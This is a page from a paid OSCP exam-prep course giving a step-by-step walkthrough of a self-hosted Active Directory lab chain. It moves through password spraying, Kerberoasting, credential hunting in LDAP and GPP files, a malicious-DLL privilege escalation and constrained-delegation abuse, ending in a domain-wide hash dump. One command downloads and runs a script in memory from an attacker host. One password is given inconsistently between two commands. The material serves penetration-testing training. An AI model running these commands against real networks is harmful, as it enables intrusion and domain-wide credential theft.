
  
OSCP® Exam Prep CourseActive Directory Chains

Lesson 44 of 97

Completed

Start here8/8

Active Directory24/24

Active Directory Chains15/15

Chain 01: First ContactBuild a solid foundation for attacking Active Directory environments.Chain 02: StolenDevelop reliable credential access and lateral movement techniques.Chain 03: BleedWideExpand domain access through coordinated AD attacks and spraying.Chain 04: Inside JobLeverage pivoting to reach vulnerable services inside AD networks.Chain 05: GroupThinkPerform network pivoting and abuse misconfigured Group Policies to extend and maintain control.Chain 06: TrustfallShape misconfigurations and open services into borrowed authority.Chain 07: CrosslinkAbuse trusted access, traverse isolated networks, and escalate across hidden infrastructure.Chain 08: RicochetAbuse injectable endpoints, bypass their defense, and relay it across the domain to seize control.Chain 09: BloodhuntMap the hidden edges, and abuse what others overlook. Only the certified will be let through.Chain 10: ReplicantFollow the unseen edges, migrate into a living process, and make the controller surrender every secret.Chain 11: Cold StorageEscalate through a task, comb the host for credentials, and crack any encryption in your way.Chain 12: DelegateRun as the account left in the open, crack what the cache remembers, then delegate the rights to domain compromise.Chain 13: FailsafeDecrypt a GPP password, crack two vaults, and ride a WriteDacl edge to Domain Admin.Chain 14: Open RelayLeak a credential from SNMP, seize the Spooler for SYSTEM, then relay and reset your way to the domain.Chain 15: OverwriteHop a SQL linked server, loot LSA secrets twice, and reset an account to own the domain.

Initial Access17/17

Privilege Escalation15/15

Pivoting and Tunneling6/6

The Exam5/5

Notes and extras7/7

Lab

AD Chain_12

A domain controller and two Windows clients. Runs on your own machine. The download is sold in the shop, separate from membership, and is yours to keep.

[Get this chain](https://buymeacoffee.com/hackacademy/e/564072)[About this chain](https://hackerblueprint.com/labs#chain-12)[All chains bundle](https://buymeacoffee.com/hackacademy/e/582690)

Not startedStartedRooted

Wrote a walkthrough?

We'd love to see how you took this chain! Written up or on video, both are great. Email it to us and we'll take a look.

[Email your walkthrough](mailto:hacking.academy@protonmail.com?subject=Walkthrough%3A%20Chain%2012%3A%20Delegate)

Tags

AD EnumerationKerberoastingPassword SprayingWindows PrivescCredential DumpingPassword CrackingGPP PasswordsConstrained Delegation

PreviousCompletedNext: Chain 13: FailsafeContinue

Chat  
and notesHelp[Ideas](https://discord.com/channels/1325919248954167468/1325966774881226862)

## Chain 12: Delegate

16 steps

Close

0:00 / 1:42:09

Auto

1

Find the hosts with netexec

BackNext step

Your lab addressesTarget IPDC IP

1. 1Find the hosts with netexec_0:01_
    
    SMB is open by default on both Windows 10 clients and the domain controller, so the fastest way to find the domain members is to sweep the range over SMB. We read the local route, then runs netexec against the whole subnet.
    
    Each live host returns its name and domain. Here three hosts report the `hackerblueprint.local` domain: the domain controller and two clients. Those IPs go into a list for the scans that follow.
    
    ```
    ip route
    ```
    
    Copy
    
    Prints the routing table so you can read off the local subnet and the interface that reaches the target network.
    
    ```
    netexec smb TARGET_IP/24
    ```
    
    Copy
    
    Sweeps the subnet over SMB and prints each host's name and domain, which identifies the domain controller and the two clients in one pass.
    
    **Tip**A host whose domain field is only its own name is not part of the AD domain. Keep only the hosts that report `hackerblueprint.local`.
    
2. 2Port scan the targets with nmap_0:47_
    
    With the IPs saved to a file, we feed them to nmap with `-iL`, scanning every TCP port with the service and script probes in one run, and save the output to a file.
    
    The result is unremarkable, which is itself worth noting: the DC exposes the usual Kerberos, LDAP, SMB and WinRM, and both clients add RDP on top of WinRM. There is no odd port to chase, so the way in has to come from enumeration, not from a service exploit.
    
    ```
    nmap -v -p- -sV -sC -Pn -iL ips -oN nmap.log
    ```
    
    Copy
    
    Scans every TCP port of the three hosts with the version and default script probes, and writes the run to nmap.log. `-Pn` skips host discovery and `-iL` reads the addresses from the file.
    
    **Tip**Write down what is open per host. RDP on the clients and WinRM everywhere decide which shells you can take later, so you want that list in front of you.
    
3. 3Ingest AD data with bloodhound-python_1:34_
    
    While the scan runs, we bring up BloodHound Community Edition and collect the domain with the `bloodhound-python` ingestor using the starter credentials. The DC is both the target and the DNS server so names resolve.
    
    The ingestor pulls users, groups and computers into JSON, which is zipped and uploaded through the BloodHound web interface at `localhost:8080`. Getting this running early means the graph is ready the moment you have a question to ask of it.
    
    ```
    docker-compose pull && docker-compose up -d
    ```
    
    Copy
    
    Starts the BloodHound CE containers in the background so the web UI and database come up.
    
    ```
    bloodhound-python -u k.owens -p 'Onboard#2024' -d hackerblueprint.local -ns DC_IP -c all
    ```
    
    Copy
    
    Collects AD data over LDAP as k.owens. `-d` sets the domain, `-ns` points DNS at the DC and `-c all` gathers every collection method.
    
    **Tip**Point `-ns` at the domain controller. If name resolution fails, the ingestor cannot find the hosts it needs to query.
    
4. 4Pull users and spray the starting credentials_7:44_
    
    We list the domain users with netexec's `--users` flag and reads the description column, a common place for plaintext passwords. Nothing is there this time. The starter password is then sprayed across every user and every protocol with `--continue-on-success`.
    
    The spray confirms k.owens works but produces no shell, and no other account shares that password. This is the cheap check that sometimes ends a chain in two minutes; here it only tells you the easy win is not available.
    
    ```
    netexec smb DC_IP -u k.owens -p 'Onboard#2024' --users
    ```
    
    Copy
    
    Lists all domain users and their description fields from the DC, in case a password was left in a description.
    
    ```
    netexec smb ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Sprays every username and password over SMB against the whole range. `--continue-on-success` keeps testing after the first hit.
    
    ```
    netexec winrm ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Repeats the spray over WinRM. RDP and RPC are worth the same pass, since access often exists on only one protocol.
    
    **Tip**Keep a running `users.txt` and `pass.txt`. Every new name or password goes in both, ready to re-spray after each find.
    
5. 5Find the Kerberoastable account in BloodHound_11:47_
    
    With the graph loaded, we mark k.owens as owned and check its outbound object control, which is empty. The saved queries then do the heavy lifting: AS-REP roasting returns nothing, but the Kerberoastable query surfaces an account named `svc_sched`.
    
    A Kerberoastable account is one with a service principal name, so any domain user can request a service ticket for it and crack the ticket offline. That makes svc_sched the first real lead, even though you do not control it yet.
    
    **Tip**Run the AS-REP and Kerberoasting saved queries on every engagement. They read straight from the DC data and point you at accounts you can attack without a shell.
    
6. 6Kerberoast svc_sched and try to crack it_14:18_
    
    We request the service ticket over LDAP with netexec and saves the hash. John and hashcat then run it against rockyou.txt, and when that fails, against the stronger SecLists wordlists and the best64 rule set.
    
    Nothing cracks. The important habit here is to try a few wordlists and a rule or two, then stop. If a Kerberoastable account will not crack after a reasonable effort, label it a rabbit hole and move on rather than grinding. It comes back later in the chain by a completely different route.
    
    ```
    netexec ldap DC_IP -u k.owens -p 'Onboard#2024' --kerberoasting kerb.hash
    ```
    
    Copy
    
    Requests a service ticket for every Kerberoastable account and writes the crackable hashes to `kerb.hash`. Set `-ns DC_IP` if the request errors on name resolution.
    
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt kerb.hash
    ```
    
    Copy
    
    Cracks the service ticket with John against rockyou.txt. John identifies the hash type automatically.
    
    ```
    hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
    ```
    
    Copy
    
    Cracks the same ticket with hashcat. `-m 13100` is the Kerberoast (TGS-REP) mode and `-r` applies the best64 rule set to the wordlist.
    
    **Tip**Give a Kerberoast hash a few wordlists and a rule set, no more. If it will not fall, note it and move on; a hash you cannot crack is of no use until something else hands you the password.
    
7. 7Rule out ADCS once for the whole chain_23:32_
    
    Before spending time on certificate attacks, we check whether there is a Certificate Authority at all, running certipy against the DC. The connection is refused: there is no ADCS in this environment.
    
    That single check saves you from re-testing certificate paths after every new credential. It is worth doing early precisely so you can stop thinking about it, and it is the kind of negative result that belongs in your notes.
    
    ```
    certipy-ad find -u k.owens@hackerblueprint.local -p 'Onboard#2024' -dc-ip DC_IP
    ```
    
    Copy
    
    Enumerates ADCS from the domain. A refused connection here means there is no Certificate Authority, so certificate attacks are off the table for the rest of the chain.
    
    **Tip**If you are unsure whether a CA exists, this check costs nothing. Once it comes back empty, stop re-running certificate tooling on every new account.
    
8. 8Enumerate shares and spider the files_25:49_
    
    We list shares across all hosts over SMB and finds a non-default `IT` share on client1 alongside the usual SYSVOL and NETLOGON on the DC. netexec's spider module then downloads the readable files so they can be read on Kali.
    
    The IT share holds a readme, a host inventory and a WiFi setup note. Two of the notes carry a password each, and both go into the password list: they belong to local accounts, which the spray against the local account list then confirms. SYSVOL is checked too, since that is where GPP passwords and logon scripts sometimes live.
    
    ```
    netexec smb TARGET_IP/24 -u k.owens -p 'Onboard#2024' --shares
    ```
    
    Copy
    
    Lists every share and your access on each host. A non-default name like `IT` is the one to investigate.
    
    ```
    netexec smb TARGET_IP/24 -u k.owens -p 'Onboard#2024' -M spider_plus -o DOWNLOAD_FLAG=True
    ```
    
    Copy
    
    Spiders the readable shares and downloads the files to a local folder. The module skips print and IPC shares by default.
    
    **Tip**Always run share enumeration against every host, not just one, and re-run it each time you gain a new account. New credentials open shares that were invisible before.
    
9. 9Dig credentials out of the LDAP info field_36:12_
    
    The description field was empty, but it is not the only field that holds text. We save a plain LDAP search of the directory to a file called `ldapdump`, then greps it, first for the description lines and then for anything password shaped. The match sits in the less obvious `info` attribute and reads like a temporary password with a note to change it.
    
    This is a field BloodHound does not show, so it only surfaces through manual LDAP work. Spraying the found value over SMB validates it against the account `r.shaw`, and crucially there is no forced-reset error, so the password is live.
    
    ```
    netexec ldap DC_IP -u k.owens -p 'Onboard#2024' -M get-desc-users
    ```
    
    Copy
    
    Runs the module that prints the description of every account in one line each. It is the quick read of the field before the raw dump.
    
    ```
    cat ldapdump | grep -i ':' | grep -i desc
    ```
    
    Copy
    
    Prints only the description lines from the saved directory dump. Reading them together shows which fields are filler and which ones hold text a person typed.
    
    ```
    cat ldapdump | grep -i 'pass'
    ```
    
    Copy
    
    Searches the whole dump for anything password shaped. The match is an `info` attribute that reads like a temporary password with a note to change it.
    
    ```
    netexec smb ips -u users -p pass --continue-on-success
    ```
    
    Copy
    
    Sprays the new password with the existing list against every account. One pair answers without a reset error, which proves the value is live.
    
    **Tip**Passwords hide in `info`, `comment` and other user attributes, not only `description`. When the obvious fields are empty, dump LDAP and read the rest.
    
10. 10RDP to client1 as r.shaw_53:51_
    
    The spray showed r.shaw working over RDP on client1, so we connect with an RDP client. A user is already signed in, and the lab is built so that session logs out after about thirty seconds, handing you the desktop.
    
    Inside, `whoami /all` shows r.shaw is an ordinary user: no admin rights and no interesting privileges. That is expected. The foothold is a place to enumerate from, not the escalation itself.
    
    ```
    xfreerdp /u:r.shaw /p:'TempPass#2019' /v:TARGET_IP
    ```
    
    Copy
    
    Opens an RDP session to client1 as r.shaw. `/u` and `/p` are the credentials and `/v` is the target host.
    
    ```
    whoami /all
    ```
    
    Copy
    
    Lists the current token's groups and privileges. Here it confirms r.shaw is a plain user with nothing obvious to abuse yet.
    
    **Tip**Before marking a user owned in BloodHound, do it. Setting r.shaw as owned keeps the shortest-path queries honest as you collect more accounts.
    
11. 11Find autologon creds with PowerUp_55:25_
    
    With no obvious privilege, we serve PowerUp.ps1 from Kali, pull it into memory on client1 and run `Invoke-AllChecks`. Among the output is a set of autologon credentials stored in the registry: the user name is `svc_kiosk` and the password is `Kl0sk#Adm2024`, with a zero in place of the o.
    
    Those credentials do not grant remote access anywhere, which is easy to read as a dead end. It is not. A credential you cannot log in with remotely can still be used locally, on the very host you are already sitting on.
    
    ```
    IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerUp.ps1'); Invoke-AllChecks
    ```
    
    Copy
    
    Downloads PowerUp into memory and runs every privilege-escalation check. It reports the registry autologon credentials for svc_kiosk.
    
    **Tip**Run both PowerUp and a second tool like PrivescCheck. They give targeted output, and one often confirms or clarifies what the other reports.
    
12. 12Switch to svc_kiosk and abuse SeManageVolume_1:02:23_
    
    Because svc_kiosk has no remote access, we start a process as that user locally with runas, entering `Kl0sk#Adm2024` at the prompt. The new shell's `whoami /all` reveals the point of the pivot: svc_kiosk holds `SeManageVolumePrivilege`.
    
    That privilege can be turned into full control of the `C:\` drive. We run SeManageVolumeExploit.exe to grant that control, drops a malicious `PrintConfig.dll` into the print driver path, and triggers it with a listener waiting. The callback lands as NT AUTHORITY\SYSTEM.
    
    ```
    runas /user:client1\svc_kiosk powershell
    ```
    
    Copy
    
    Starts PowerShell as the local svc_kiosk account. Prefixing the hostname keeps it local instead of defaulting to the domain.
    
    ```
    .\SeManageVolumeExploit.exe
    ```
    
    Copy
    
    Abuses SeManageVolumePrivilege to grant the Users group full control over `C:\`, which lets you write into protected system folders.
    
    ```
    icacls C:\
    ```
    
    Copy
    
    Confirms the permission change on the C: drive before and after the exploit, so you can see Users gain full control.
    
    **Tip**`SeManageVolumePrivilege` looks minor but leads to SYSTEM: it gives you write access over `C:\`, and from there a DLL hijack in a system path does the rest.
    
13. 13Promote r.shaw and dump cached credentials_1:13:41_
    
    From the SYSTEM shell, we add the domain user r.shaw to the local Administrators group so hashes can be dumped remotely over SMB. netexec then confirms r.shaw is Pwn3d on client1 and dumps LSA secrets.
    
    The LSA dump returns a cached domain credential for a new account, `m.dunn`, stored as an mscache2 (DCC2) entry from a past logon. Cached credentials like this cannot be passed or relayed, so the only way to use one is to crack it.
    
    ```
    net localgroup Administrators r.shaw /add
    ```
    
    Copy
    
    Adds the domain user r.shaw to the local Administrators group on client1, giving it the rights to dump hashes remotely.
    
    ```
    netexec smb TARGET_IP -u r.shaw -p 'TempPass#2019' --lsa
    ```
    
    Copy
    
    Dumps LSA secrets over SMB now that r.shaw is a local admin. This is where the cached domain credential for m.dunn appears.
    
    **Tip**SAM gives local hashes, but LSA secrets are where cached domain logons live. Always run the LSA dump, not only SAM.
    
14. 14Crack the cached credential and pivot to client2_1:15:23_
    
    The cached m.dunn hash is a DCC2 value, so we run hashcat in the mscache2 mode against rockyou.txt. It cracks to a plaintext password, which goes into the lists and is sprayed again.
    
    The spray reports m.dunn Pwn3d on client2, a host not touched before. It did not report on the DC, so m.dunn is a local admin on the client rather than a domain admin, but that is enough to take a shell and dump the next host.
    
    ```
    hashcat -m 2100 mscache.hash /usr/share/wordlists/rockyou.txt
    ```
    
    Copy
    
    Cracks the cached domain credential. `-m 2100` is the mscache2 (DCC2) mode, which must be set explicitly.
    
    ```
    netexec smb TARGET_IP/24 -u m.dunn -p 'Brandon#1' --continue-on-success
    ```
    
    Copy
    
    Sprays the cracked credential across the hosts. It reports Pwn3d on client2, meaning local admin there.
    
    ```
    xfreerdp /u:m.dunn /p:'Brandon' /v:TARGET_IP
    ```
    
    Copy
    
    Opens an RDP session to client2 as m.dunn, who logs in with full local administrator rights.
    
    **Tip**Pwn3d over SMB on a client but not the DC means local admin on that host, not domain admin. It is still a pivot; just do not assume it owns the domain.
    
15. 15Recover the GPP password on client2_1:27:03_
    
    As admin on client2, we run a drive-wide credential-hunting script and find a `cpassword` in a Group Policy Preferences file left in the policy history. GPP cpasswords are encrypted with a key Microsoft published, so `gpp-decrypt` returns the plaintext instantly.
    
    The plaintext is `Gx7#nQ2v!mK9wLz`, and it belongs to `svc_sched`, the same Kerberoastable user that would not crack back at the start. The chain did not need that hash after all; the password was sitting in a GPP file the whole time.
    
    ```
    gpp-decrypt '<cpassword>'
    ```
    
    Copy
    
    Decrypts a GPP cpassword using the published AES key and prints the plaintext. The recovered account is svc_sched.
    
    ```
    netexec smb DC_IP -u svc_sched -p 'Gx7#nQ2v!mK9wLz' --continue-on-success
    ```
    
    Copy
    
    Tests the decrypted password against the account on the controller. A valid answer means the same account we could not crack from its ticket is now ours through a file left in the policy history.
    
    **Tip**An earlier rabbit hole often has a second door. The Kerberoast that would not crack was solved by a GPP cpassword, so keep every interesting account in mind as you enumerate new hosts.
    
16. 16Abuse constrained delegation to own the DC_1:36:23_
    
    Back in BloodHound, svc_sched shows constrained delegation with protocol transition, allowed to delegate to the domain controller. We confirm it with Impacket's findDelegation.py, then requests a service ticket impersonating the administrator for the DC's service.
    
    That ticket authenticates as a domain admin to the DC. After adding the DC's full name to `/etc/hosts` and exporting the ticket, secretsdump.py dumps NTDS.dit, the hash of every domain account. psexec.py with the same ticket, or a pass-the-hash with the recovered administrator hash, lands a SYSTEM shell on the DC and completes the chain.
    
    ```
    findDelegation.py hackerblueprint.local/svc_sched:'Gx7#nQ2v!mK9wLz'
    ```
    
    Copy
    
    Lists every account with a delegation right and what it may delegate to. The account shows constrained delegation to the file service on the controller.
    
    ```
    impacket-getST -spn 'cifs/DC01.hackerblueprint.local' -impersonate 'Administrator' hackerblueprint.local/svc_sched:'Gx7#nQ2v!mK9wLz'
    ```
    
    Copy
    
    Asks for a service ticket for the controller's file service while impersonating the Administrator. The account's delegation right is what allows the impersonation.
    
    ```
    KRB5CCNAME=Administrator@cifs_DC01.hackerblueprint.local@HACKERBLUEPRINT.LOCAL.ccache secretsdump.py -k -no-pass DC01.hackerblueprint.local
    ```
    
    Copy
    
    Uses the saved ticket to read the controller's directory database and prints every hash. The `-k` flag authenticates with the ticket and no password is sent.
    
    ```
    psexec.py -k -no-pass DC01.hackerblueprint.local
    ```
    
    Copy
    
    Opens a shell on the controller with the same ticket. The identity there is the impersonated administrator, which is SYSTEM level on the domain controller.
    
    **Tip**For ticket-based attacks you must add the DC's fully qualified name to `/etc/hosts` and target that name, not the IP. Kerberos validates the SPN, so the IP will fail.

